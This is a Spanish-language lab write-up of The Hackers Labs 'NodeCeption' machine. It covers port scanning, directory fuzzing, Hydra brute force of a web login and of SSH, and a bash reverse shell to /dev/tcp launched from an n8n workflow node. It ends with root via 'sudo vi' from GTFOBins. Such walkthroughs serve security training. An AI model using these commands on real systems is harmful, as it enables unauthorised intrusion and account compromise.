---
tags:
  - Cybersecurity
  - Labs
  - TheHackersLabs
  - Easy
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Burp Suite|Burp Suite]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]
		- [[#Escalada de Privilegios#Hydra|Hydra]]
		- [[#Escalada de Privilegios#SSH|SSH]]

---
# Resolviendo la máquina NodeCeption

>En esta publicación, comparto cómo revolví la máquina **NodeCeption** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/118).

![](Screenshots/Pasted%20image%2020251026084159.png)

---
## Enumeración
### Ping

`ping -c 1 192.168.1.184`

![](Screenshots/Pasted%20image%2020251026085149.png)

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 192.168.1.184 -oG allPorts`

![](Screenshots/Pasted%20image%2020251026085310.png)

`nmap -p22,5678,8765 -sCV 192.168.1.184 -oN targeted`

![](Screenshots/Pasted%20image%2020251026085347.png)
![](Screenshots/Pasted%20image%2020251026085408.png)
### HTTP

`http://192.168.1.184:8765/`

![](Screenshots/Pasted%20image%2020251026085533.png)

![](Screenshots/Pasted%20image%2020251026085608.png)

Se encuentra el usuario `usuario@maildelctf.com`.
#### Fuzzing Web

`gobuster dir -u http://192.168.1.184:8765 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020251026085944.png)

`192.168.1.184:8765/login.php`

![](Screenshots/Pasted%20image%2020251026090143.png)

---
## Explotación
### Burp Suite

Para poder realizar fuerza bruta, es necesario ver como viaje la petición **POST**.

![](Screenshots/Pasted%20image%2020251026090645.png)
### Hydra

Se procede a realizar fuerza bruta.

`hydra -l usuario@maildelctf.com -P /usr/share/wordlists/rockyou.txt -s 8765 192.168.1.184 http-post-form "/login.php:email=usuario@maildelctf.com&password=^PASS^:Credenciales incorrectas."`

![](Screenshots/Pasted%20image%2020251026091054.png)

Se obtiene la contraseña del usuario `usuario@maildelctf.com`.

Se inicia sesión en la web.

![](Screenshots/Pasted%20image%2020251026091149.png)
### Reverse Shell

Se accede a *n8n*.

`http://192.168.1.184:5678`

![](Screenshots/Pasted%20image%2020251026091320.png)

Se inicia sesión con el usuario y la contraseña obtenidos anteriormente.

![](Screenshots/Pasted%20image%2020251026091410.png)

Se crea un nuevo *Workflow*, para realizar la *Reverse Shell*.

Para poder ejecutar un comando se busca: `Execute Command`.

![](Screenshots/Pasted%20image%2020251026091551.png)

![](Screenshots/Pasted%20image%2020251026091611.png)

Nos ponemos en escucha por el puerto `1234` para recibir la *Reverse Shell*.

`nc -nlvp 1234 `

Se ejecuta el comando `bash -c 'exec bash -i &>/dev/tcp/192.168.1.127/1234 <&1'` para lanzarla.

![](Screenshots/Pasted%20image%2020251026092422.png)
### Escalada de Privilegios
#### Sudo

`sudo -l`

![](Screenshots/Pasted%20image%2020251026092722.png)

Se realiza una búsqueda del binario: `a` en [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo).

![](Screenshots/Pasted%20image%2020251026093447.png)

`sudo vi -c ':!/bin/sh' /dev/null`

![](Screenshots/Pasted%20image%2020251026093838.png)

Es necesario meter la contraseña de un usuario.

Se averigua el usuario: `cat /etc/passwd`.

![](Screenshots/Pasted%20image%2020251026093950.png)
#### Hydra

Al saber el usuario `thl` se procede a realizar fuerza bruta para saber la contraseña y conectarnos mediante **SSH**.

`hydra -l thl -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.184 -t 64`

![](Screenshots/Pasted%20image%2020251026094900.png)

Se encuentra la contraseña para el usuario `thl`.
#### SSH

Nos conectamos al servicio **SSH**.

`ssh thl@192.168.1.184`

![](Screenshots/Pasted%20image%2020251026095039.png)

`sudo vi -c ':!/bin/sh' /dev/null`

![](Screenshots/Pasted%20image%2020251026095149.png)

---